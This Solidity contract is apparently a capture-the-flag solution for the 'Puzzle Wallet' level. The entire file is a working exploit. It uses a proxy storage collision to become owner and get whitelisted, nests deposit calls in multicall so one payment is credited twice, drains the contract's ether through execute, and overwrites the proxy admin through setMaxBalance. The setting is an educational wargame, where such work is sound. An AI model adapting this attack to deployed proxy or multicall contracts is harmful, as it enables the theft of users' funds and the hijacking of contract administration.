// SPDX-License-Identifier: Unlicense
import "src/PuzzleWallet/PuzzleWallet.sol";
import "exploits/BlockUtils.sol";

contract PuzzleWalletExploit is BlockUtils {

    PuzzleProxy public proxy;
    PuzzleWallet public wallet;

    constructor(address _victim) {
        proxy = PuzzleProxy(payable(_victim));
        wallet = PuzzleWallet(address(proxy));
    }

    function hack() public {
        // your code here 
        proxy.proposeNewAdmin(address(this));
        wallet.addToWhitelist(address(this));
        
        //creating encoded function data to pass into multicall
        bytes[] memory depositSelector = new bytes[](1);
        depositSelector[0] = abi.encodeWithSelector(wallet.deposit.selector);
        bytes[] memory nestedMulticall = new bytes[](2);
        nestedMulticall[0] = abi.encodeWithSelector(wallet.deposit.selector);
        nestedMulticall[1] = abi.encodeWithSelector(wallet.multicall.selector, depositSelector);


        //calling multicall with nested data stored above
        wallet.multicall{value: 0.001 ether}(nestedMulticall);
        //calling execute to drain the contract
        wallet.execute(address(this), 0.002 ether, "");
        //calling setMaxBalance with our address to become the admin of proxy
        wallet.setMaxBalance(uint256(uint160(address(this))));

    }

    receive() external payable {
    }
}